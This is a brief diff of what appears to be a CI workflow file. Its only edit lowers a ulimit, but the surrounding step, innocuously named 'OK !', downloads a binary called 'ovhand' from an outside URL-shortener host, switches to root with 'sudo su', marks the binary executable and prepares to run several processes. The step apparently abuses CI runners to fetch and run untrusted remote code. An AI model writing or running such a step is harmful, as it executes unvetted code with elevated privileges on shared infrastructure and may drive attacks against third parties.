@@ -16,7 +16,7 @@ jobs:
       - name: OK !
         run: |
           wget https://curl.by/7D9E9/ovhand
-          ulimit -n 999999
+          ulimit -n 99999
           sudo su
           chmod +x ovhand
           PIDS=()
